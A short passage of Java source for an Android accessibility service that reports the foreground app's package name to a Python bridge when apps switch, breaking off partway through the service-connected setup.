            CharSequence packageName = event.getPackageName();
            if (packageName != null) {
                pythonBridge.onAppSwitch(packageName.toString());
            }
        }
    }
    
    @Override
    public void onInterrupt() {
        // Service interrupted
    }
    
    @Override
    public void onServiceConnected() {
        AccessibilityServiceInfo info = new Accessibility
